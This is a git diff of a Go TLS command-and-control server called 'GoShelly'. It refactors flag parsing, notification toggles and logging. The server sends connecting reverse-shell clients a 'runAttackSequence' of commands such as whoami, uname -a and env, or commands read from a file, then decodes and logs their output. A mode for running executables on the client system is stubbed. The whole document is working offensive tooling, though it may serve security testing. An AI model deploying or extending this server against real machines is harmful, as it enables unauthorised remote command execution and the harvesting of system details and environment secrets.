@@ -6,6 +6,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
+	"flag"
 	"fmt"
 	"io"
 	"log"
@@ -13,25 +14,18 @@ import (
 	"net/mail"
 	"os"
 	"os/exec"
+
+	"strconv"
 	"strings"
 	"time"
+
 	"github.com/joho/godotenv"
-	"github.com/slack-go/slack"
 )
 
 func handleError(err error) {
 	if err != nil {
 		log.Fatal(err)
 	}
-}
-
-func validateMailAddress(address string) bool {
-	_, err := mail.ParseAddress(address)
-	if err != nil {
-		fmt.Println("Invalid Email Address")
-		os.Exit(1)
-	}
-	return true
 }
 
 //file upl/downl functions, if needed
@@ -57,48 +51,43 @@ func downloadFile(conn net.Conn, path string) {
 	_, err = io.Copy(fo, conn)
 	handleError(err)
 }
+func validateMailAddress(address string) bool {
+	_, err := mail.ParseAddress(address)
+	if err != nil {
+		servlog.Println("Invalid Email Address. Proceeding anyway.")
+	}
+	return true
+}
 
-func sendEmail(enable bool, email string, conn net.Conn) { 
-	if !enable {
+func sendEmail(conn net.Conn) {
+	if !emailEN {
 		return
 	}
 }
 
-func sendSlackMessage(enable bool, CHANNEL_ID string, MESSAGE string, conn net.Conn) bool { //use ind 4
-	if !enable {
-		return false
+func sendSlackMessage(conn net.Conn) {
+	if !slackEN {
+		return
 	}
-
-	api := slack.New(os.Getenv("SLACK_BOT_TOKEN")) //Soham - SLACK BOT TOKEN NOT YET GENERATED.
-
-	channelID, timestamp, err := api.PostMessage(
-		CHANNEL_ID,
-		slack.MsgOptionText(MESSAGE, false),
-	)
-
-	if err != nil {
-		fmt.Printf("%s\n", err)
-		return false
-	}
-	fmt.Printf("Message successfully sent to channel %s at %s", channelID, timestamp)
-	return true
 }
 
-func genCert(email string) string {
-	cmd, err := exec.Command("bash", "./certGen.sh", email).Output()
+func genCert() {
+
+	servlog.Println("Generating SSL Certificate")
+	validateMailAddress(os.Getenv("SSLCERTGENEMAIL_SERVER"))
+	_, err := exec.Command("/bin/bash", "./certGen.sh", os.Getenv("SSLCERTGENEMAIL_SERVER")).Output()
 
 	if err != nil {
-		fmt.Printf("Error generating SSL Certificate: %s\n", err)
+		servlog.Printf("Error generating SSL Certificate: %s\n", err)
 		os.Exit(1)
 	}
-	outstr := string(cmd)
-	return outstr
 }
 
-func readFile(filePathName string) ([]string, int) {
-	file, err := os.Open(filePathName)
+func readFile() []string {
+
+	file, err := os.Open(instrfile)
 	if err != nil {
-		fmt.Println("Failed to open file.")
+		log.Panic("Failed to open file.")
 		os.Exit(1)
 	}
 	scanner := bufio.NewScanner(file)
@@ -109,12 +98,10 @@ func readFile(filePathName string) ([]string, int) {
 		text = append(text, scanner.Text())
 	}
 	file.Close()
-	return text, len(text)
-
+	return text
 }
 
-func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
-	os.Mkdir("./logs/", os.ModePerm)
+func handleClient(conn net.Conn) {
 
 	file, err := os.OpenFile("./logs/"+conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -124,110 +111,114 @@ func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
 	logger := log.New(file, "", log.LstdFlags)
 	logger.Println("FILE BEGINS HERE.")
 	logger.Println("Client connected: ", conn.RemoteAddr())
-	runAttackSequence(conn, logger, cmdsToRun)
+	runAttackSequence(conn, logger)
 	disconnectClient(conn, logger, *file)
+	sendEmail(conn)
+	sendSlackMessage(conn)
 }
 
 func setReadDeadLine(conn net.Conn) {
 	err := conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 	if err != nil {
-		log.Println("SetReadDeadline failed:", err)
+		log.Panic("SetReadDeadline failed:", err)
 	}
 }
 
 func setWriteDeadLine(conn net.Conn) {
 	err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 	if err != nil {
-		log.Println("SetWriteDeadline failed:", err)
+		log.Panic("SetWriteDeadline failed:", err)
 	}
 }
 
-func checkEnableFlags(arguments []string, len int, cIndex int) (bool, bool) {
-	switch len {
-	case cIndex:
-		fmt.Println("No enable flags provided. No notifications enabled.")
-		return false, false
-
-	case cIndex + 1:
-		if arguments[cIndex] == "-e" {
-			fmt.Println("Only email notifications enabled.")
-			return true, false
-		} else if arguments[cIndex] == "-es" || arguments[cIndex] == "-se" {
-			fmt.Println("Both Email and Slack notifications enabled.")
-			return true, true
-		} else if arguments[cIndex] == "-s" {
-			fmt.Println("Only Slack notifications enabled.")
-			return false, true
-		} else {
-			fmt.Println("Wrong enable flag provided. Please use the following list of commands to enable notifications:")
-			printFlagHelp()
-			os.Exit(1)
-		}
+//If enable values are present as env vars, they are used.
+func checkEnableFlags() {
+	switch notEN {
+	case "":
+		servlog.Println("No enable flags provided. Checking and utilising env variables.")
+		break
+	case "-e":
+		servlog.Println("Only email notifications enabled.")
+		emailEN = true
+		return
+	case "-es", "-se":
+		servlog.Println("Both Email and Slack notifications enabled.")
+		emailEN = true
+		slackEN = true
+		return
+	case "-s":
+		servlog.Println("Only Slack notifications enabled.")
+		slackEN = true
+		return
+	default:
+		servlog.Println("Wrong enable flag provided. Please use the following list of commands to enable notifications:")
+		printFlagHelp()
+		os.Exit(1)
 	}
-	return false, false
+
+	tempEmailEN, emailErr := strconv.ParseBool(os.Getenv("EMAIL_ENABLE"))
+	tempSlackEN, slackErr := strconv.ParseBool(os.Getenv("SLACK_ENABLE"))
+
+	if emailErr == nil {
+		servlog.Println("Email notifcation enable env var present.")
+		emailEN = tempEmailEN
+	}
+	if slackErr == nil {
+		servlog.Println("Slack notifcation enable env var present.")
+		slackEN = tempSlackEN
+	}
+	if slackErr != nil && emailErr != nil {
+		servlog.Println("No notification env variable present, defaulting to false.")
+		slackEN = false
+		emailEN = false
+	}
+
 }
 
 func printFlagHelp() {
-	fmt.Println("'-e' : To enable only Email notifications.")
-	fmt.Println("'-s' : To enable only Email notifications.")
-	fmt.Println("'-es' or '-se' : To enable both Email and Slack notifications.")
+	fmt.Println("Wrong flag. Choose from the options below.")
+	fmt.Println("'e' : To enable only Email notifications.")
+	fmt.Println("'s' : To enable only Email notifications.")
+	fmt.Println("'es' or 'se' : To enable both Email and Slack notifications.")
 	fmt.Println("To disable notifications, skip the enable flag.")
 }
-func checkFlags(arguments []string, l int, cmdsToRun []string) ([]string, bool, bool) {
-	switch arguments[1] {
-	case "-a": //run sample commands -> echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"
-		//cindex 2
-		fmt.Println("Running default commands", cmdsToRun)
-		emailEN, slackEN := checkEnableFlags(arguments, len(arguments), 2)
-		return cmdsToRun, emailEN, slackEN
-	case "-fe": //run commands from file
-		if l < 3 {
-			fmt.Println("No filename specified.")
-			os.Exit(1)
-		}
 
-		//check if filepath exists
-		if _, err := os.Stat(arguments[2]); err == nil {
-			fmt.Printf("File exists. Executing commands from file.\n")
-		} else {
-			fmt.Printf("File does not exist\n")
-			os.Exit(1)
-		}
-		cmdsToRun, _ = readFile(arguments[2])
-		//cindex 3
-		emailEN, slackEN := checkEnableFlags(arguments, len(arguments), 3)
-		return cmdsToRun, emailEN, slackEN
+func checkFlags() {
+	servlog.Println("Checking Input Flags")
+	if len(os.Args) < 2 {
+		fmt.Println("Incorrect number of input arguments.")
+		os.Exit(1)
+	}
+
+	switch mode {
+	case "a": //run sample commands -> echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"
+		//cindex 2
+		servlog.Println("Run default commands", cmdsToRun)
+		checkEnableFlags()
+	case "fe": //run commands from file
+		servlog.Println("Run commands from file.")
+		cmdsToRun = readFile()
+		checkEnableFlags()
 
 	//***************************************************//
 	// case "-fue" yet to be implemented//
 	//***************************************************//
-	case "-fu":
-		os.Exit(12) //COMMENT OR DELETE AFTER CASE "-fu" is implemented correctly, this line is to prevent accidentally using this
-		//mode
-		if l != 3 {
-			fmt.Println("No filename specified.")
-			os.Exit(1)
-		}
-		//check if filepath exists
-		if _, err := os.Stat(arguments[2]); err != nil {
-			fmt.Printf("Filepath does not exist\n")
-			os.Exit(1)
-		}
-		return []string{}, false, false //for now, until "-fu" implementation is complete
+	case "fue":
+		servlog.Println("File upload execute.")
+		servlog.Println("Not yet available. Stay tuned in :)")
+		os.Exit(1)
 	default:
-		fmt.Printf("'%s' is not a listed command, please choose from the following: \n", arguments[1])
-		fmt.Println("-a : Run \"echo $ARAALI_COUNT\", \"uname -a\", \"whoami\", \"pwd\", \"env\"")
-		fmt.Println("-fe : Run commands from a file specified as argument 3")
-		fmt.Println("-fue : Run an executable file on the client system, specified as argument 3")
+		fmt.Printf("'%s' is not a listed command, please choose from the following: \n", mode)
+		fmt.Println("a : Run \"echo $ARAALI_COUNT\", \"uname -a\", \"whoami\", \"pwd\", \"env\"")
+		fmt.Println("fe : Run commands from the instructions file")
+		fmt.Println("fue : Run an executable file on the client system")
 		fmt.Println("Please use the following list of commands to enable notifications:")
 		printFlagHelp()
 		os.Exit(1)
 	}
-	return []string{}, false, false
 }
 
-func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
-
+func runAttackSequence(conn net.Conn, logger *log.Logger) {
 	buffer := make([]byte, 1024)
 	for _, element := range cmdsToRun {
 		element = strings.TrimSpace(element)
@@ -247,55 +238,87 @@ func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
 		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
 		logger.Println("RES: " + string(decodedStr[:]))
 	}
-	logger.Println("\nDONE.\nFILE ENDS HERE.")
 }
 
 func disconnectClient(conn net.Conn, logger *log.Logger, file os.File) {
 	logger.Println("Disconnecting Client: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
+	logger.Println("\nDONE.\nFILE ENDS HERE.")
 	file.Close()
 	conn.Close()
 }
+
+//global variables
+var help = flag.Bool("help", false, "Show flag help")
+var slackEN bool
+var emailEN bool
+var servlog *log.Logger
+var cmdsToRun []string
+var instrfile string
+var mode string
+var l net.Listener
+var notEN string
+
 func main() {
-	err := godotenv.Load()
-	if err != nil {
-		fmt.Println("Could not open .env file.")
-		os.Exit(1)
+	flag.StringVar(&notEN, "not", "", "Email and Slack notifications enable")
+	flag.StringVar(&instrfile, "f", "instr.*", "Instructions filepath/filename")
+	flag.StringVar(&mode, "mode", "a", "mode")
+
+	// Parse the flag
+	flag.Parse()
+
+	// Usage Demo
+	if *help {
+		flag.Usage()
+		os.Exit(0)
 	}
-	cmdsToRun := []string{"ls", "uname -a", "whoami", "pwd", "env"}
-	MESSAGE := os.Getenv("MESSAGE")       //These two fields need to be added
-	CHANNEL_ID := os.Getenv("CHANNEL_ID") //These two fields need to be added
-	EMAILID := os.Getenv("EMAIL_ID")
-	PORT := os.Getenv("PORT")
-	genCert(os.Getenv("SSLCERTGENEMAIL_SERVER")) //to generate SSL certificate
-
-	arguments := os.Args
-	cmdsToRun, _, _ = checkFlags(arguments, len(arguments), cmdsToRun) //emailEN and slackEN values are ignored
-
-	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
+	os.Mkdir("./logs/", os.ModePerm)
+	servfile, err := os.OpenFile("./logs/"+"GoShellyServerLogs"+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		log.Fatalf("server: loadkeys: %s", err)
+		fmt.Println("Server log open error: ", err)
+		return
+	}
+
+	defer servfile.Close()
+	servlog = log.New(servfile, "", log.LstdFlags)
+	servlog.Println("Starting GoShelly server...")
+
+	err = godotenv.Load()
+	if err != nil {
+		servlog.Println("Could not open .env file.")
+		return
+	}
+	cmdsToRun = []string{"ls", "uname -a", "whoami", "pwd", "env"}
+	PORT := os.Getenv("PORT")
+
+	genCert() //to generate SSL certificate
+
+	checkFlags() //emailEN and slackEN values are ignored
+
+	servlog.Println("Loading SSL Certificates")
+	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
+
+	if err != nil {
+		servlog.Printf("Error Loading Certificate: %s", err)
+		return
 	}
 	config := tls.Config{Certificates: []tls.Certificate{cert}}
 	config.Rand = rand.Reader
 	service := "0.0.0.0:" + PORT
 
-	listener, err := tls.Listen("tcp", service, &config)
+	l, err = tls.Listen("tcp", service, &config)
 	if err != nil {
-		log.Fatalf("Server Listen: %s", err)
+		servlog.Printf("Server Listen error: %s", err)
 	}
-	fmt.Println("Server Listening on port: ", PORT)
+	servlog.Println("Server Listening on port: ", PORT)
+
 	for {
-		conn, err := listener.Accept()
+		conn, err := l.Accept()
 
 		if err != nil {
-			log.Printf("Client accept error: %s", err)
+			servlog.Printf("%s Client accept error: %s", conn.RemoteAddr(), err)
 			continue
 		}
-
-		sendEmail(false, EMAILID, conn) //"false" hardcoded as notifications are not yet implemented
-		sendSlackMessage(false, CHANNEL_ID, MESSAGE, conn) //"false" hardcoded as notifications are not yet implemented
-
-		log.Printf("Client accepted: %s", conn.RemoteAddr())
+		servlog.Printf("Client accepted: %s", conn.RemoteAddr())
 		tlscon, ok := conn.(*tls.Conn)
 		if ok {
 			log.Print("ok=true")
@@ -304,6 +327,7 @@ func main() {
 				log.Print(x509.MarshalPKIXPublicKey(v.PublicKey))
 			}
 		}
-		go handleClient(conn, listener, cmdsToRun)
+		servlog.Println("Handling Client: ", conn.RemoteAddr())
+		go handleClient(conn)
 	}
 }
